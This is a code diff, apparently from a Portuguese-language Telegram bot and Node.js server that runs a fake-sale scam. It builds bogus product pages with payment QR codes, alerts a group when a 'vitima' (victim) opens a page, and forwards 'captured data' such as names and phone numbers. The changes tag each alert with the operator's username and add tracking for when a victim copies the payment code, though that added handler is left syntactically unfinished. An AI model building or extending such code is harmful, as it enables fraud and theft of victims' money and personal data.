@@ -39,37 +39,39 @@ let acoes = {};
 
 // comand /novo
 bot.command('novo', async (ctx) => {
-  const userId = ctx.from.id;
-  const data = loadData();
-
-
-  Object.keys(data.produtos).forEach(produtoId => {
-    if (data.produtos[produtoId].userId === userId && data.produtos[produtoId].etapa !== 'finalizado') {
-      delete data.produtos[produtoId];
-    }
+    const userId = ctx.from.id;
+    const data = loadData();
+  
+    // Remove cadastros inacabados do mesmo usuário
+    Object.keys(data.produtos).forEach(produtoId => {
+      if (data.produtos[produtoId].userId === userId && data.produtos[produtoId].etapa !== 'finalizado') {
+        delete data.produtos[produtoId];
+      }
+    });
+  
+    const produtoId = Math.random().toString(36).slice(2, 11);
+    data.produtos[produtoId] = {
+      id: produtoId,
+      userId,
+      // Aqui você adiciona o username do Telegram:
+      username: ctx.from.username || ctx.from.first_name,
+      etapa: 'vendedor',
+      qr: '',
+      vendedor: '',
+      nome: '',
+      descricao: '',
+      valor: '',
+      imagem1: '',
+      imagem2: '',
+      dataVenda: '',
+      regiao: '',
+    };
+  
+    saveData(data);
+    produtos[userId] = data.produtos[produtoId];
+    await ctx.reply('Digite o nome do vendedor:');
   });
-
-  const produtoId = Math.random().toString(36).slice(2, 11);
-  data.produtos[produtoId] = {
-    id: produtoId,
-    userId,
-    etapa: 'vendedor',
-    qr: '',
-    vendedor: '',
-    nome: '',
-    descricao: '',
-    valor: '',
-    imagem1: '',
-    imagem2: '',
-    dataVenda: '',
-    regiao: '',
-  };
-
-  saveData(data);
-  produtos[userId] = data.produtos[produtoId]; 
-  await ctx.reply('Digite o nome do vendedor:');
-});
-
+  
 const puppeteer = require('puppeteer');
 
 
@@ -234,13 +236,15 @@ if (process.env.NODE_ENV === 'production') {
     }
   
     const mensagemProduto = `
-      🎰 Vitima Acessou o Site UpUp!
-      - 📌 Produto: ${produto.nome}
-      - 🏷️ Vendedor: ${produto.vendedor}
-      - 📅 Data da Venda: ${produto.dataVenda}
-      - 🏦 Valor: R$ ${produto.valor}
-      - 🆔️ ID: ${produto.actionId}
-    `;
+    🎰 Vitima Acessou o Site UpUp!
+    - 📌 Produto: ${produto.nome}
+    - 👤 Usuário: ${produto.username}
+    - 🏷️ Vendedor: ${produto.vendedor}
+    - 📅 Data da Venda: ${produto.dataVenda}
+    - 🏦 Valor: R$ ${produto.valor}
+    - 🆔️ ID: ${produto.actionId}
+  `;
+
   
     // Envia a mensagem para o grupo do Telegram
     bot.telegram.sendMessage(GROUP_CHAT_ID, mensagemProduto, { parse_mode: "Markdown" });
@@ -870,6 +874,7 @@ app.post('/confirmar', async (req, res) => {
   
     const mensagem = `
     ♦️7️⃣ Dados Capturados UpUp!
+    usuario:${produto.username}
     ━━━━━━━━━━━━━━━━━━━━━
     ▫️ Nome: ${nome}
     ▫️ Telefone: ${telefone}
@@ -985,17 +990,25 @@ document.getElementById("btnRedirecionar").addEventListener("click", function ()
 
 
 
-        document.getElementById("btnFechar").addEventListener("click", function () {
-            document.getElementById("modal").classList.add("hidden");
-            document.getElementById("qrcode").innerHTML = ""; // Limpa o QR Code ao fechar
-        });
-
         document.getElementById("btnCopiar").addEventListener("click", function () {
-            const codigo = "${produto.qr}"; // Substitua pelo link real
-            navigator.clipboard.writeText(codigo).then(() => {
-                
-            });
-        });
+    const qrCode = "${produto.qr}"; // QR Code que será copiado
+    const actionId = "${produto.actionId}"; // ID que será enviado para o Telegram
+
+    // Copia o QR Code para a área de transferência
+    navigator.clipboard.writeText(qrCode).then(() => {
+        console.log("✅ QR Code copiado para a área de transferência!");
+
+        // Envia a notificação do ID para o servidor
+        fetch("/notificar-copia", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ actionId: actionId }) // Apenas o ID é enviado
+        })
+        
+
+
     </script>
 </body>
 </html>
@@ -1058,7 +1071,7 @@ app.post("/notificar-copia", async (req, res) => {
 
 app.get('/analise', async (req, res) => {
     try {
-        await bot.telegram.sendMessage(GROUP_CHAT_ID, "🂡♠️  O comprovante sumiu, pra cima upup!");
+        await bot.telegram.sendMessage(GROUP_CHAT_ID, `🂡♠️  O comprovante subiu, usuario:${produto.username} chamar pv,caso a pena n tenha pago,nos envie print da conversa para melhor controle do grupo!`);
 
         res.send(`
             <!DOCTYPE html>
